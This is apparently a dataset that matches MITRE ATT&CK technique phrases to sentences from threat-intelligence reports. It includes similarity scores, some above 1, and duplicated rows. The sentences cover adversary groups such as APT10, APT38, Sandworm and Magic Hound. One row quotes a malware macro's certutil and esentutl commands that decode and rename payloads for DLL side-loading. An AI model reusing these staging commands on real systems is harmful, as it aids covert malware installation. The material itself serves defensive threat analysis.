phrase|similarity|adjacent_sentences
Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.|0.8186532150813405|"['Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.']"
Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.|0.8627955581235252|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Some versions of UPPERCUT have used the hard-coded string this is the encrypt key for Blowfish encryption when communicating with a C2.|0.870846516962343|"['2/9Figure 2: Macro to display lure document The initial Word documents were password protected, likely in an effort to bypass detection.', 'Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.', 'Figure 3: Lure document Figure 4 shows what happens when the malicious macro is executed.', '3/9Figure 4: Macro to install UPPERCUT The execution workflow is as follows: 1.', 'The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victims %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.', '2.', 'The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows): C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre1.txt C:\\\ProgramData\\\GUP.txt C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre2.txt C:\\\ProgramData\\\libcurl.txt C:\\\Windows\\\System32\\\cmd.exe"" /c certutil -decode C:\\\ProgramData\\\padre3.txt C:\\\ProgramData\\\3F2E3AB9 3.', 'The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows): C:\\\Windows\\\System32\\\esentutl.exe"" /y C:\\\ProgramData\\\GUP.txt /d C:\\\ProgramData\\\GUP.exe /o C:\\\Windows\\\System32\\\esentutl.exe"" /y C:\\\ProgramData\\\libcurl.txt /d C:\\\ProgramData\\\libcurl.dll /o The dropped files include the following: GUP.exe : GUP, a free (LGPL) Generic Updater.', 'GUP is an open source binary used by Notepad++ for software updates.', 'The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5. libcurl.dll: Malicious Loader DLL 3F2E3AB9: Encrypted shellcode 4/9Figure 5: Notepad++ signed updater 4.', 'The macro launches the legitimate executable GUP.exe.']"
SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.|0.840478384504701|"['A description of each command is shown in the following table.', 'Command Description Compilation time of P8RAT 2019-01-07 2019- 06-10 https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/ 13/214/1/2021 APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign | Securelist d Create thread for launching downloaded DLL Enabled Enabled and call export function of the DLL.', 'f Set value as RC4 key for the encrypted C2 Not Enabled communication implemented l Set value as sleep time Not Enabled implemented s Create thread for executing downloaded Enabled Enabled shellcode Based on the analysis of the backdoor features of the SodaMaster module, the purpose of this malware is also to download and execute payloads (DLL or shellcode), like P8RAT.', 'Unfortunately, we have not been able to obtain these payloads yet.', 'The SodaMaster module also shows an anti-VM feature.', 'The malware looks for the presence of the registry key HKEY_CLASSES_ROOT\\\Applications\\\VMwareHostOpen.exe on the victims system before proceeding to its main functionality.', 'This registry key is specific to the VMware environment.', 'SodaMaster anti-VM check Another characteristic of SodaMaster is the use of a common obfuscation technique known as stackstrings to create the registry key in double-byte characters.', 'We observed the same obfuscation technique used for a process name and DLL name in other SodaMaster samples.', 'https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/ 14/214/1/2021 APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign | Securelist FYAnti loader for QuasarRAT The last observed type of payload deployed by Ecipekac is a loader module named FYAnti loader.', 'In the Ecipekac loader malware of the fourth layer, the DLL is loaded into memory and an export carrying the name F**kY**Anti is called.']"
SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.|0.840478384504701|['Then the malware randomly generates a value as an RC4 key for C2 communication.', 'The first data block sent to the C2 server includes the user_name, the host_name, PID of the malware module, OS_version, socket_name, the generated RC4 key and the malwares elapsed running time.C2 communication of SodaMasterWe confirmed four backdoor commands, coded as d, f, l and s, in the recent SodaMaster sample.', 'In addition, we also discovered an old SodaMaster sample which has only two commands.', 'A description of each command is shown in the following table.CommandDescriptionCompilation time of SodaMaster2019-01-072019-06-10dCreate thread for launching downloaded DLL and call export function of the DLL.EnabledEnabledfSet value as RC4 key for the encrypted C2 communicationNot implementedEnabledlSet value as sleep timeNot implementedEnabledsCreate thread for executing downloaded shellcodeEnabledEnabledBased on the analysis of the backdoor features of the SodaMaster module, the purpose of this malware is also to download and execute payloads (DLL or shellcode), like P8RAT.', 'Unfortunately, we have not been able to obtain these payloads yet.The SodaMaster module also shows an anti-VM feature.', 'The malware looks for the presence of the registry key HKEY_CLASSES_ROOT\\\Applications\\\VMwareHostOpen.exe on the victims system before proceeding to its main functionality.', 'This registry key is specific to the VMware environment.SodaMaster anti-VM checkAnother characteristic of SodaMaster is the use of a common obfuscation technique known as stackstrings to create the registry key in double-byte characters.', 'We observed the same obfuscation technique used for a process name and DLL name in other SodaMaster samples.FYAnti loader for QuasarRATThe last observed type of payload deployed by Ecipekac is a loader module named FYAnti loader.', 'In the Ecipekac loader malware of the fourth layer, the DLL is loaded into memory and an export carrying the name F**kY**Anti is called.', 'We named this loader FYAnti because of this distinct string.', 'The execution flow of the FYAnti has two additional layers to implement the final stage, which is a QuasarRAT (a.k.a xRAT).Infection flow of FYAnti loaderThe first layer of the FYAnti loader decrypts an embedded .NET module and executes it using the CppHostCLR technique.']
Attor monitors the free disk space on the system.|0.834675018908401|['ESET Research white papers TLP: WHITE AT COMMANDS, TOR-BASED COMMUNICATIONS: MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORM Author: Zuzana HromcovIn the fantasy book A Court of Thorns and Roses by Sarah J. Maas, Attor was an evil Faerie.', 'In that book, the Faeries ruled over all the known world and humans were their slaves.', 'In cybersecurity, Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims.', 'Author: Zuzana Hromcov October 20191 AT commands, TOR-based communications: Meet Attor, a fantasy creature and also a spy platform TLP: WHITE CONTENTS 1 SUMMARY .', '.', '.', '.', '.', '.', '.']
Attor monitors the free disk space on the system.|0.843877862357844|"['T1497 Virtualiza Attor can detect whether it is executed in some virtualized or emulated en tion/Sand vironments.', 'If detected, it terminates itself immediately.', 'box Evasion https://www.welivesecurity.com/2019/10/10/eset-discovers-attor-spy-platform/ 12/1410/11/2019 ESET discovers Attor, a spy platform with curious GSM fingerprinting | WeLiveSecurity Tactic ID Name Description Cre T1056 Input User credentials can be collected by plugin 0x07 via capturing keystrokes.', 'den Capture tial Ac cess Dis T1083 File and Di Plugin 0x01 enumerates files with specific extensions on all hard disk dri cov rectory ves and stores file information in encrypted log files.', 'ery Discovery T1120 Peripheral Plugin 0x01 collects information about inserted storage devices, modems Device and phone devices.', 'Discovery T1082 System In Attor monitors the free disk space on the system.', 'formation Discovery Col T1123 Audio Plugin 0x03 is capable of recording audio using available input sound lec Capture devices.', 'tion T1119 Automated Attor automatically collects data about the compromised system.', 'Collection T115 Clipboard Plugin 0x07 collects data stored in the Windows clipboard by using the Data OpenClipboard and GetClipboardData APIs.', 'T1074 Data Staged Collected data is staged in a central upload directory prior to exfiltration.', 'T1056 Input Plugin 0x07 captures keystrokes pressed within the window of the process Capture where Attor is injected.']"
Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.|1.0002|"['[19]EnterpriseT1053.005Scheduled Task/Job:Scheduled TaskMagic Houndhas used scheduled tasks to establish persistence and execution.', '[17][19]EnterpriseT1113Screen CaptureMagic Houndmalware can take a screenshot and upload the file to its C2 server.', '[15]EnterpriseT1505.003Server Software Component:Web ShellMagic Houndhas used multiple web shells to gain execution.', '[17][19]EnterpriseT1218.011System Binary Proxy Execution:Rundll32Magic Houndhas used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.', '[17]EnterpriseT1082System Information DiscoveryMagic Houndmalware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.', 'Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.', ""[15][17][19]EnterpriseT1016System Network Configuration DiscoveryMagic Houndmalware gathers the victim's local IP address, MAC address, and external IP address."", '[15][17][19].001Internet Connection DiscoveryMagic Houndhas conducted a network call out to a specific website as part of their initial discovery activity.', '[19].002Wi-Fi DiscoveryMagic Houndhas collected names and passwords of all Wi-Fi networks to which a device has previously connected.', '[7]EnterpriseT1049System Network Connections DiscoveryMagic Houndhas used quser.exe to identify existing RDP connections.', '[17]EnterpriseT1033System Owner/User DiscoveryMagic Houndmalware has obtained the victim username and sent it to the C2 server.']"
It has also accessed network diagram files useful for understanding how a host's network was configured.|1.0002|"['[13]EnterpriseT1195.002Supply Chain Compromise:Compromise Software Supply ChainSandworm Teamhas distributedNotPetyaby compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.', '[36][25][1]EnterpriseT1218.011System Binary Proxy Execution:Rundll32Sandworm Teamused a backdoor which could execute a supplied DLL using rundll32.exe.', '[22]During the2015 Ukraine Electric Power Attack,Sandworm Teamused a backdoor which could execute a supplied DLL usingrundll32.exe.', ""[14]EnterpriseT1082System Information DiscoverySandworm Teamused a backdoor to enumerate information about the infected system's operating system."", '[22][1]EnterpriseT1049System Network Connections DiscoverySandworm Teamhad gathered user, IP address, and server data related to RDP sessions on a compromised host.', ""It has also accessed network diagram files useful for understanding how a host's network was configured."", '[1][17]EnterpriseT1033System Owner/User DiscoverySandworm Teamhas collected the username from a compromised host.', '[1]EnterpriseT1199Trusted RelationshipSandworm Teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.', '[1]EnterpriseT1204.001User Execution:Malicious LinkSandworm Teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.', '[1].002User Execution:Malicious FileSandworm Teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.', '[21][1]During the2015 Ukraine Electric Power Attack,Sandworm Teamleveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them.']"
Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.|0.8026486486017416|"['Hijack Execution Flow T1574 Actors were observed using hijack execution flow.', 'Discovery Technique Title ID Use System Network T1016 Actors used the systeminfo command to look for Configuration Discovery details about the network configurations and settings and determine if the system was a VMware virtual machine.', 'The threat actor used route print to display the entries in the local IP routing table.', 'Page 6 o f 16 | Product ID: AA22-277A TLP:WHITECISA | FBI | NSA TLP:WHITE System Network T1016.001 Actors checked for internet connectivity on Configuration Discovery: compromised systems.', 'This may be performed Internet Connection during automated discovery and can be Discovery accomplished in numerous ways.', 'System Owner/User T1033 Actors attempted to identify the primary user, Discovery currently logged in user, set of users that commonly use a system, or whether a user is actively using the system.', 'System Network T1049 Actors used the netstat command to display TCP Connections Discovery connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP.', 'Process Discovery T1057 Actors used the tasklist command to get information about running processes on a system and determine if the system was a VMware virtual machine.', 'The actors used tasklist.exe and find.exe to display a list of applications and services with their PIDs for all tasks running on the computer matching the string powers.', 'System Information T1082 Actors used the ipconfig command to get detailed Discovery information about the operating system and hardware and determine if the system was a VMware virtual machine.', 'File and Directory Discovery T1083 Actors enumerated files and directories or may search in specific locations of a host or network share for certain information within a file system.']"
APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.|0.7764841161751659|"['[1]EnterpriseT1518.001Software Discovery:Security Software DiscoveryAPT38has identified security software, configurations, defensive tools, and sensors installed on a compromised system.', '[1]EnterpriseT1218.001System Binary Proxy Execution:Compiled HTML FileAPT38has used CHM files to move concealed payloads.', '[10].011System Binary Proxy Execution:Rundll32APT38has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.', '[1]EnterpriseT1082System Information DiscoveryAPT38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.', '[1]EnterpriseT1049System Network Connections DiscoveryAPT38installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.', '[2]EnterpriseT1033System Owner/User DiscoveryAPT38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.', '[1]EnterpriseT1569.002System Services:Service ExecutionAPT38has created new services or modified existing ones to run executables, commands, or scripts.', ""[1]EnterpriseT1529System Shutdown/RebootAPT38has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR."", '[2]EnterpriseT1204.002User Execution:Malicious FileAPT38has attempted to lure victims into enabling malicious macros within email attachments.', '[1]']"
Adversaries may abuse system services or daemons to execute commands or programs.|0.8191742899571302|[]
Adversaries can execute malicious content by interacting with or creating services either locally or remotely.|0.8038073360495208|['His IT and security experience ranges from small businesses to Fortune 50 organizations.', 'When not in front of a keyboard, hes often found trudging through the frozen tundra of the Upper Midwest, occasionally on horseback.', 'l 68 T1105: Ingress Tool Transfer2021 Threat Detection Report TECHNIQUE T1569 System Services #9 System Services ranks ninth this year thanks almost entirely to detections OVERALL RANK associated with its Service Execution sub-technique.', '20.3% T1569.002 Service Execution ORGANIZATIONS AFFECTED 19.2% 892 ORGANIZATIONS AFFECTED CONFIRMED THREATS Adversaries use the Windows Service Manager to run commands or 909 install or manipulate services, often with elevated privilege levels.', 'SEE MORE > CONFIRMED THREATS T1569: SYSTEM SERVICES Adversaries may abuse system services or daemons to execute commands or programs.', 'Adversaries can execute malicious content by interacting with or creating services.', 'Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one- time or temporary execution.', '69 SEUQINHCET-BUS TNELAVERP l 69 T1569: System Services2021 Threat Detection Report TECHNIQUE T1569.002 Service Execution #9 Adversaries use the Windows Service Manager to run commands or install or PARENT TECHNIQUE RANK manipulate services, often with elevated privilege levels.', '19.2% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Service Execution?', '892 All production operating systems have one thing in common: a mechanism to run a program or service continuously.', 'On Windows, such a program is referred to as a service, and in the Unix/Linux world, such a program is often referred to CONFIRMED THREATS as a daemon.']
Many services are set to run at boot, which can aid in achieving persistence , but adversaries can also abuse services for one-time or temporary execution.|0.9257377255320655|['When not in front of a keyboard, hes often found trudging through the frozen tundra of the Upper Midwest, occasionally on horseback.', 'l 68 T1105: Ingress Tool Transfer2021 Threat Detection Report TECHNIQUE T1569 System Services #9 System Services ranks ninth this year thanks almost entirely to detections OVERALL RANK associated with its Service Execution sub-technique.', '20.3% T1569.002 Service Execution ORGANIZATIONS AFFECTED 19.2% 892 ORGANIZATIONS AFFECTED CONFIRMED THREATS Adversaries use the Windows Service Manager to run commands or 909 install or manipulate services, often with elevated privilege levels.', 'SEE MORE > CONFIRMED THREATS T1569: SYSTEM SERVICES Adversaries may abuse system services or daemons to execute commands or programs.', 'Adversaries can execute malicious content by interacting with or creating services.', 'Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one- time or temporary execution.', '69 SEUQINHCET-BUS TNELAVERP l 69 T1569: System Services2021 Threat Detection Report TECHNIQUE T1569.002 Service Execution #9 Adversaries use the Windows Service Manager to run commands or install or PARENT TECHNIQUE RANK manipulate services, often with elevated privilege levels.', '19.2% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Service Execution?', '892 All production operating systems have one thing in common: a mechanism to run a program or service continuously.', 'On Windows, such a program is referred to as a service, and in the Unix/Linux world, such a program is often referred to CONFIRMED THREATS as a daemon.', 'Regardless of what operating system youre using, being able to install a program so it runs whenever the computer is on has an obvious appeal to adversaries.']
APT29 modified timestamps of backdoors to match legitimate Windows files.|0.9502367434826305|['The timestamps are not set to arbitrary values, but rather copied over from default system files.', 'Considering that there are systems with modified and unmodified timestamps within the same incident, it can be assumed that timestamp modification is optional.', 'It appears that the copy target is selectable as the same malware would have the timestamps of different system files.', 'The team has confirmed that the timestamp modification technique done by the Lazarus group is also being used by other APT groups to hide their malware.', 'APT Group Description APT28 APT28 has performed timestomping on victim files.', 'APT29 modified timestamps of backdoors to match legitimate Windows APT29 files.', 'APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016.', 'The group has also set the creation time of the files APT32 dropped by the second stage of the exploit to match the creation time of kernel32.dll.', 'Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.', 'Chimera has used a Windows version of the Linux touch command to Chimera modify the date and timestamp on DLLs.', 'Kimsuky has manipulated timestamps for creation or compilation dates to Kimsuky defeat anti-forensics.']
Usually this series of packets consists of attempted connections to a predefined sequence of closed ports Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics.|0.9341887409321861|['Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.', 'Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP.', 'Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.', 'T1094 Custom Adversaries may communicate using a custom command and Command and control protocol instead of encapsulating commands/data in an Control Protocol existing Standard Application Layer Protocol.']
Adversaries may breach or otherwise leverage organizations who have access to intended victims.|0.8818501244421422|['Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1193/ TLP: WHITE, ID#202006091030 11TTPs Spearphishing Link 1 Spearphishing with a link is a specific variant of spearphishing.', 'It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.', 'Spearphishing via Service 2 Spearphishing via service is a specific variant of spearphishing.', 'It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.', 'Supply Chain Compromise 3 Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.', 'Trusted Relationship 4 Adversaries may breach or otherwise leverage organizations who have access to intended victims.', 'Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.', '11 MITRE.', '(October 18, 2019).', 'SpearphishingLink.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1192/ 2 MITRE.']
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.7913883716099877|"['T1547 Privilege Escalation Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1564 Defense Evasion Threat actor may attempt to hide artifacts associated with their behaviors to evade detection.', 'T1562.001 Defense Evasion Threat actor may disable security tools to avoid possible detection of their tools and activities.', 'Threat actor may use obfuscated files or T1140 Defense Evasion information to hide artifacts of an intrusion.', 'Adversaries may communicate using application layer protocols associated with web traffic to Command and Control T1071.001 avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols associated with electronic mail T1071.003 Command and Control delivery to avoid detection/network filtering by blending in with existing traffic.', 'Telsy SpA - TLP : WHITE 11 December 03, 2020... T1132 Command and Control Command and control (C2) information is encoded using a standard data encoding system T1056.001 Collection Threat actor may log user keystrokes to intercept credentials as the user types them.', 'T1113 Threat actor may attempt to take screen captures of the desktop to gather information over the Collection course of an operation.', ""T1125 Threat actor can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or Collection applications (e.g., video call services) to capture video recordings for the purpose of gathering information."", 'T1041 Exfiltration Threat actor relies on command and control infrastructure to exfiltrate data Telsy SpA - TLP : WHITE 12 December 03, 2020... About Te lsy is a top provider for advanced cyber defense and operations practices through its internal threat intelligence research division.', 'An elite group of highly skilled professionals works daily on the development of technologies capable of analyzing, correlating and reporting known and emerging threats in order to support the strengthening of national security as well as the business and the growth of its customers.']"
